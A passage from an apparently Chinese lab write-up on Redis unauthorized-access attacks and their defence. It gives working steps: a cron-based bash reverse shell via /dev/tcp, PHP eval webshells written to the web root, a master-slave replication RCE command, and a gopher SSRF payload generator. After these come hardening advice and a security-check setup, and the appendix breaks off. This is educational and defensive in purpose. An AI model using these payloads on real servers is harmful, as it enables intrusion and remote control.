修改数据库的默认路径，使其指向目标主机上的计划任务路径。</li><li><strong>数据写入文件：</strong> 将数据库中的数据写入目标主机上的计划任务文件。</li></ol><p>通过以上步骤，攻击者可以在目标主机上成功写入一个计划任务，从而实现反弹 Shell。</p><p>在攻击机kali上开启监听：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">nc</span> <span class="hljs-string">-lvp</span> <span class="hljs-number">51888</span><br></code></pre></td></tr></table></figure><p>然后连接服务端的Redis，写入反弹shell的计划任务：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">./</span>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> <span class="hljs-operator">-</span>p <span class="hljs-number">6379</span> <span class="hljs-operator">-</span>a foobared<br><span class="hljs-keyword">set</span> cron <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.198.144/51888 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-operator">/</span>cron<br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511032133259.png" alt="image-20240511032133259"></p><p>经过一分钟以后，在攻击机的nc中成功反弹shell回来。</p><h3 id="（3）网站绝对路径写-webshell"><a href="#（3）网站绝对路径写-webshell" class="headerlink" title="（3）网站绝对路径写 webshell"></a>（3）网站绝对路径写 webshell</h3><p>对目标机器进行信息收集，看看端口是否开放了哪些</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- -T4 <span class="hljs-number">192.168.198.144</span><br>dirb http://192.168.198.144:80   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511040341109.png" alt="image-20240511040341109"></p><p><strong>写入webshell</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">./redis-cli -h 192.168.198.144 -p 6379 -a foobared//连接redis</span><br><span class="language-xml">config set dir /var/www/html/ </span><br><span class="language-xml">set xxx &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">config set dbfilename shell.php </span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511040545099.png" alt="image-20240511040545099"></p><p><strong>蚁剑成功连接</strong></p><p><img src="/img/course/image-20240511040152924.png" alt="image-20240511040152924"></p><h3 id="（4）利用Redis主从复制GetShell"><a href="#（4）利用Redis主从复制GetShell" class="headerlink" title="（4）利用Redis主从复制GetShell"></a>（4）利用Redis主从复制GetShell</h3><p>Redis服务器存在一些大型网站采用的漏洞,例如如果使用了一台Redis服务器,且该服务器存在漏洞,攻击者可以远程执行命令导致数据泄露或损坏。图中还提到,Redis服务器集群可以很好地解决该问题,例如主从服务器复制,即使主服务器被攻击,也可以从从服务器进行数据管理和恢复。</p><p>Redis主从复制(Redis Replication)是一种数据复制技术,通过在多台服务器实例之间自动进行数据同步,来实现数据冗余备份、故障恢复以及负载均衡等功能。其基本原理是使用一个主(master)服务器实例和多个从(slave)服务器实例,实现数据的单向复制。主服务器负责数据的写入和读取操作,而从服务器则只负责通过复制主服务器中的数据来实现数据备份,从而达到数据冗余和异地容灾的目的。一旦主服务器出现故障,可以手动或自动进行主从服务器切换,将某一从服务器升级为新的主服务器,从而确保数据服务的可用性。</p><p>因为漏洞存在于4.x、5.x版本中，Redis提供了主从模式。<br>故靶机更换为 centos 192.168.198.147   redis-4.0.8</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">./redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.147</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">6379</span> -<span class="hljs-selector-tag">a</span> foobared<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 redis-rce.py -r 192.168.198.147 -L 192.168.198.134 -f exp.so -a foobared<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">python3 redis-rce.py -r rhost -lhost lhost -f exp.so -a password</span><br></code></pre></td></tr></table></figure><p>选择<code>r</code>来获得一个反弹shell</p><p><img src="/img/course/image-20240511172423214.png" alt="image-20240511172423214"></p><p>成功反弹shell，反弹shell很容易导致Redis暴毙</p><p><img src="/img/course/image-20240511173054864.png" alt="image-20240511173054864"></p><h3 id="（5）结合-SSRF-进行利用"><a href="#（5）结合-SSRF-进行利用" class="headerlink" title="（5）结合 SSRF 进行利用"></a>（5）结合 SSRF 进行利用</h3><p>SSRF 攻击的目标是从外网无法访问的内部系统，这里通过 SSRF 使用 dict 协议访问本地 Redis</p><p>构造 Redis 命令写入 webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">set 1 &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>\[\\<span class="hljs-string">&quot;f4ke\\&quot;</span>\]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename 5he1l.php</span><br><span class="language-xml">save</span><br><span class="language-xml">quit</span><br></code></pre></td></tr></table></figure><p>根据 RESP 协议使用python 脚本<code>redisSsrf.py</code>，将上述命令转换为 gopher payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>protocol = <span class="hljs-string">&quot;gopher://&quot;</span><br>ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-string">&quot;6379&quot;</span><br>shell = <span class="hljs-string">&quot;\\n\\n&lt;?php eval($_POST\[\\&quot;</span>f4ke\\<span class="hljs-string">&quot;\]);?&gt;\\n\\n&quot;</span><br>filename = <span class="hljs-string">&quot;5he1l.php&quot;</span><br>path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd = <span class="hljs-string">&quot;&quot;</span><br>cmd = [<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),  <br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span>,<br>     <span class="hljs-string">&quot;quit&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload = protocol + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF = <span class="hljs-string">&quot;\\r\\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.quote(redis_format(x))<br><br>    <span class="hljs-comment"># print(payload)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://192.168.198.147/ssrf.php?url=&quot;</span>+urllib.parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成 payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.198.147</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A6379/_%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aflushall%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A3%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25241</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252433</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">253</span>C%<span class="hljs-number">253</span>Fphp%<span class="hljs-number">2520</span>eval%<span class="hljs-number">2528</span>%<span class="hljs-number">2524</span>_POST%<span class="hljs-number">255</span>B%<span class="hljs-number">2522</span>f4ke%<span class="hljs-number">2522</span>%<span class="hljs-number">255</span>D%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">253</span>F%<span class="hljs-number">253</span>E%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252413</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A/var/www/html%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25249</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A5he1l.php%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aquit%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure><p>使用curl 访问构造好的 url ， 成功执行 Redis 命令写入 webshell</p><p><img src="/img/course/image-20240512212439121.png" alt="image-20240512212439121"></p><p>使用蚁剑尝试连接，连接成功</p><p><img src="/img/course/image-20240512212826275.png" alt="image-20240512212826275"></p><p>为了修复Redis未授权访问漏洞，可以采取以下措施：</p><ol><li><strong>设置密码认证</strong>：在Redis配置文件中启用<code>requirepass</code>选项，并设置一个强密码。</li><li><strong>限制访问</strong>：修改<code>bind</code>配置，只允许信任的IP地址访问Redis服务。</li><li><strong>使用安全通信</strong>：通过SSL&#x2F;TLS加密Redis客户端和服务器之间的通信。</li><li><strong>监控和日志记录</strong>：开启Redis的日志记录功能，监控可疑的访问和操作。</li><li><strong>及时更新</strong>：保持Redis版本更新，以修复已知的安全漏洞。</li></ol><h1 id="Redis-安全防护策略"><a href="#Redis-安全防护策略" class="headerlink" title="Redis 安全防护策略"></a>Redis 安全防护策略</h1><h2 id="1-配置访问控制策略"><a href="#1-配置访问控制策略" class="headerlink" title="1.配置访问控制策略"></a>1.配置访问控制策略</h2><h3 id="禁止监听在公网地址"><a href="#禁止监听在公网地址" class="headerlink" title="禁止监听在公网地址"></a>禁止监听在公网地址</h3><p>修改 Redis 监听端口，在配置文件 redis.conf 中进行设置，找到包含 bind 的行，将默认的<code>bind 0.0.0.0</code>改为<code>bind 127.0.0.1</code>或者内网 IP网段，重启 Redis以使配置生效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">bind</span> 192.168.1.100 10.0.0.1</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure><h3 id="使用防火墙"><a href="#使用防火墙" class="headerlink" title="使用防火墙"></a>使用防火墙</h3><p>在服务器上配置防火墙，仅允许特定规则的Redis连接请求通过。阻止其他不必要的连接请求，降低安全风险。</p><h2 id="2-修改默认配置"><a href="#2-修改默认配置" class="headerlink" title="2.修改默认配置"></a>2.修改默认配置</h2><h3 id="更改默认端口"><a href="#更改默认端口" class="headerlink" title="更改默认端口"></a>更改默认端口</h3><p>Redis 默认监听的端口为 6379，可以将配置文件的port项修改为其他非常用端口以隐藏服务</p><h3 id="开启-Redis-安全认证并设置复杂的密码"><a href="#开启-Redis-安全认证并设置复杂的密码" class="headerlink" title="开启 Redis 安全认证并设置复杂的密码"></a>开启 Redis 安全认证并设置复杂的密码</h3><p>Redis默认配置是无密码的，故容易导致Redis的未授权访问。在 redis.conf 配置文件中，修改 requirepass 选项开启密码认证并设置强密码。</p><h3 id="开启保护模式"><a href="#开启保护模式" class="headerlink" title="开启保护模式"></a>开启保护模式</h3><p>Redis在3.2版本新增了安全配置项protected-mode，开启后要求需要配置bind项并设置访问密码，关闭后允许远程连接。在 redis.conf 配置文件中，修改 protected-mode yes 选项开启保护模式，只允许有授权的主机远程访问。</p><h2 id="3-禁止使用-Root-权限启动"><a href="#3-禁止使用-Root-权限启动" class="headerlink" title="3.禁止使用 Root 权限启动"></a>3.禁止使用 Root 权限启动</h2><h3 id="创建单独的用户用于启动redis"><a href="#创建单独的用户用于启动redis" class="headerlink" title="创建单独的用户用于启动redis"></a>创建单独的用户用于启动redis</h3><p>使用root权限启动redis有较多风险。可以创建的一个Redis用户只用于运行 Redis 服务，而无法登录。同时redis用户没有其他目录与文件的访问权限，在未授权访问发生时，攻击者也难以通过Redis入侵服务器上的其他服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd -s /sbin/nolog -M redis <br>sudo -u redis redis-server /&lt;filepath&gt;/redis.conf <br></code></pre></td></tr></table></figure><h3 id="设置文件的访问权限"><a href="#设置文件的访问权限" class="headerlink" title="设置文件的访问权限"></a>设置文件的访问权限</h3><p>Redis 密码可明文存储在配置文件中，因此需要禁止非相关用对于配置文件的访问，设置 Redis 配置文件权限为 600，只有文件所有者拥有读和写权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 /&lt;filepath&gt;/redis.conf<br></code></pre></td></tr></table></figure><h2 id="4-监控和日志分析"><a href="#4-监控和日志分析" class="headerlink" title="4.监控和日志分析"></a>4.监控和日志分析</h2><p>定期检查Redis的访问日志，分析异常行为，及时发现和响应安全威胁。在配置文件logfile项指定日志文件保存位置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">logfile &quot;/var/log/redis.log&quot;<br></code></pre></td></tr></table></figure><h2 id="5-及时更新版本"><a href="#5-及时更新版本" class="headerlink" title="5.及时更新版本"></a>5.及时更新版本</h2><p>检查Redis版本，及时应用安全补丁和更新，以修复已知的安全漏洞。</p><p>通过上述措施，可以有效地减少Redis未授权访问漏洞的风险，保护服务器和数据的安全。</p><h1 id="防御策略验证实验"><a href="#防御策略验证实验" class="headerlink" title="防御策略验证实验"></a>防御策略验证实验</h1><p>以下通过脚本（具体代码参见附录）对redis安全性进行检查：</p><p>运行脚本，可以发现，未经安全配置的redis无法通过大多数安全检查</p><p><img src="/img/course/image-20240517233702181.png" alt="image-20240517233702181"></p><h2 id="配置防御策略"><a href="#配置防御策略" class="headerlink" title="配置防御策略"></a>配置防御策略</h2><p>1.创建单独用户用于启动redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建的 Redis 用户只能用于运行 Redis 服务，而无法登录</span><br>useradd -s /sbin/nologin -m redis  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">以redis用户启动redis</span><br>sudo -u redis nohup ./bin/redis-server ./redis.conf &amp;<br></code></pre></td></tr></table></figure><p>2.修改配置文件，设置强密码，开启protected-mode，禁止或者重命名一些高危命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑redis配置文件</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置强密码</span><br>requirepass strong_password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开启保护模式</span><br>protected-mode yes<br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 禁用高危命令：</span><br>rename-command FLUSHALL &quot;&quot;<br>rename-command CONFIG &quot;&quot;<br>rename-command EVAL &quot;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改高危命令的名称：</span><br>rename-command FLUSHALL &quot;shuaxin&quot;<br>rename-command CONFIG &quot;peizhi&quot;<br>rename-command EVAL &quot;zhixing&quot;<br></code></pre></td></tr></table></figure><p>3.配置访问控制，仅允许本地连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">允许局域网连接</span><br>bind 192.168.168.*<br><span class="hljs-meta prompt_"># </span><span class="language-bash">仅允许本地连接</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure><p>安全性验证</p><p>使用脚本进行安全检查：</p><p>由于使用了强密码，且配置了访问控制，故脚本连接时无法连接到redis。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240517154647351.png" alt="image-20240517154647351"></p><p>为了模拟密码泄露的情况，这里允许远程连接，password参数输入密码继续进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379  --password strong@pwd<br></code></pre></td></tr></table></figure><p><img src="/img/course/Inkedimage-20240517163331848.jpg" alt="Inkedimage-20240517163331848"></p><p>成功通过所有安全检查</p><h2 id="Redis安全安装与配置"><a href="#Redis安全安装与配置" class="headerlink" title="Redis安全安装与配置"></a>Redis安全安装与配置</h2><p>根据Redis安全防护策略，编写自动化shell脚本安装Redis（具体代码参见附录）</p><p>优点：</p><p>1.设置密码，并检查密码强度</p><p>2.默认开启访问控制策略，仅允许本地连接</p><p>3.systemctl配置管理，便于维护与检查</p><p>4.快速的自动化安装</p><p>一键安装</p><p><img src="/img/course/image-20240518011538733.png" alt="image-20240518011538733"></p><p><img src="/img/course/image-20240518011655104.png" alt="image-20240518011655104"></p><p>通过安全检测（由于访问控制策略，攻击主机无法连接）</p><p><img src="/img/course/image-20240518012412512.png" alt="image-20240518012412512"></p><p><img src="/img/course/image-20240518012247382.png" alt="image-20240518012247382"></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="安全性检测脚本"><a href="#安全性检测脚本" class="headerlink" title="安全性检测脚本"></a>安全性检测脚本</h2><p>check_redis_security.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span 